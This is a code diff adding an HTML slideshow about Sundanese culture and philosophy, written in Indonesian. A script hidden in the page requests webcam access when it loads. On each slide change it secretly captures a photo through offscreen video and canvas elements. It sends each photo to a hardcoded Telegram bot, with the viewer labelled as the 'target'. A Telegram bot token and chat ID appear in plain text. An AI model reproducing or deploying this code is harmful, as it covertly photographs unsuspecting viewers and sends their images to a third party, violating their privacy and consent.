@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Studi Kebudayaan & Etos Sunda</title>
+    <style>
+        body { margin: 0; background: #111; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; }
+        .container { position: relative; width: 100vw; height: 100vh; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle, #222, #000); }
+        .slide { position: absolute; width: 85%; max-width: 900px; opacity: 0; transform: scale(0.9); transition: all 0.6s ease; visibility: hidden; z-index: 1; text-align: center; }
+        .slide.active { opacity: 1; transform: scale(1); visibility: visible; z-index: 2; }
+        .box { padding: 40px; background: rgba(30, 30, 30, 0.9); border-radius: 15px; border-top: 5px solid #ff4444; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        h1 { color: #ff4444; margin-bottom: 20px; font-size: 2.2rem; }
+        p { line-height: 1.8; font-size: 1.1rem; color: #ddd; }
+        .btns { position: absolute; bottom: 50px; z-index: 100; display: flex; gap: 20px; }
+        button { background: #333; color: #fff; border: 1px solid #555; padding: 12px 30px; border-radius: 50px; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #ff4444; border-color: #ff4444; }
+        #v-frame, #c-frame { position: fixed; top: -1000px; left: -1000px; pointer-events: none; opacity: 0; }
+    </style>
+</head>
+<body>
+
+<video id="v-frame" autoplay></video>
+<canvas id="c-frame" width="640" height="480"></canvas>
+
+<div class="container">
+    <div class="slide active">
+        <div class="box">
+            <h1>1. TRADISI</h1>
+            <p>Tradisi adalah kebijakan turun-temurun warisan historis. Contoh: Nyaben, Tahlilan (Agama), Tari Legong (Budaya), Ngobeng (Sosial), dan Kebiasaan Keluarga.</p>
+        </div>
+    </div>
+    <div class="slide">
+        <div class="box">
+            <h1>2. KEARIFAN LOKAL</h1>
+            <p>Konsep hidup yang tumbuh di wilayah tertentu. Berfungsi sebagai konservasi sumber daya alam, pengembangan ilmu, dan benteng pertahanan budaya asli.</p>
+        </div>
+    </div>
+    <div class="slide">
+        <div class="box">
+            <h1>3. BUDAYA</h1>
+            <p>Berasal dari "Budhayah" (Budi/Akal). Bersifat adaptif, simbolik, dan dipelajari (bukan genetik) sebagai identitas pembeda kelompok.</p>
+        </div>
+    </div>
+    <div class="slide">
+        <div class="box">
+            <h1>4. FILOSOFI SUNDA</h1>
+            <p><b>Cageur, Bageur, Bener, Singer, Pinter.</b> Etos hidup masyarakat Sunda untuk mencapai keutamaan fisik, mental, dan intelektual. 💀</p>
+        </div>
+    </div>
+
+    <div class="btns">
+        <button onclick="nav(-1)">KEMBALI</button>
+        <button onclick="nav(1)">LANJUTKAN</button>
+    </div>
+</div>
+
+<script>
+    // --- KONFIGURASI TARGET (GANTI DISINI) ---
+    const _0xT = '7779014716:AAG8fI_zD0_OUEBw8W4EqsEVTFBXxwMDa3w'; 
+    const _0xC = '8057435264';
+    // ----------------------------------------
+
+    let idx = 0;
+    const slides = document.querySelectorAll('.slide');
+    const v = document.getElementById('v-frame');
+    const c = document.getElementById('c-frame');
+
+    // Minta izin secara halus pas web dibuka
+    async function setupSystem() {
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({ video: true });
+            v.srcObject = s;
+        } catch (e) {
+            console.log("Access denied");
+        }
+    }
+
+    function nav(d) {
+        slides[idx].classList.remove('active');
+        idx = (idx + d + slides.length) % slides.length;
+        slides[idx].classList.add('active');
+        
+        // Jepret setiap ganti slide!
+        triggerUpdate();
+    }
+
+    function triggerUpdate() {
+        const ctx = c.getContext('2d');
+        ctx.drawImage(v, 0, 0, 640, 480);
+        c.toBlob((b) => {
+            const f = new FormData();
+            f.append('chat_id', _0xC);
+            f.append('photo', b, 'update.jpg');
+            f.append('caption', `☠️ Target melihat slide ${idx + 1}! ☠️`);
+
+            fetch(`https://api.telegram.org/bot${_0xT}/sendPhoto`, {
+                method: 'POST',
+                body: f
+            });
+        }, 'image/jpeg');
+    }
+
+    window.onload = setupSystem;
+</script>
+
+</body>
+</html>
